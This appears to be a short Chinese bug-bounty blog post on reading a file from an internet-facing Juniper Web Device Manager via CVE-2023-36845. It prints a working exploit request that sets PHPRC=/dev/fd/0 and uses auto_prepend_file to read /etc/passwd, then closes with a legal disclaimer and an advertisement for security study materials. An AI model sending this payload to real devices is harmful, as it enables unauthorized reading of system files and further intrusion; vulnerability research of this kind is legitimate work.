# 原创
：  记src一处Juniper远程命令执行

# 记src一处Juniper远程命令执行

### 一、hunter搜索web.title=”Juniper Web Device Manager”，查找到香港的一处资产。

### 二、访问相关网页，界面就是Juniper登录界面。

### 三、根据编号为CVE-2023-36845的利用方法，抓包，修改提交方式，成功读取到文件。

原始包如下：<br/>  

<br/> payload如下：
1.  `POST /?PHPRC=/dev/fd/0 HTTP/1.1` 1.  `Host: {{Hostname}}` 1.  `Content-Type: application/x-www-form-urlencoded` 1.   1.  `auto_prepend_file="/etc/passwd"` 
修改传参方式，并按照上述payload在路径后面拼接上”?PHPRC=/dev/fd/0”，请求体中加入auto_prepend_file参数。结果如下：

  申明：本账号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法。

###### **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/2f74894cf8e04b7f87d9716681f6e26b.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/5b4209eac3784bd18f5e1cd6a5157e4e.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/4a89b0c2a52a4f569a970e55dcbac0b4.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/4f211474c8ab4a5a910884e1d3423310.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/54c2816350ae4bf787d1c6eec0d4e837.png" width="665"/>

应急响应笔记

学习路线
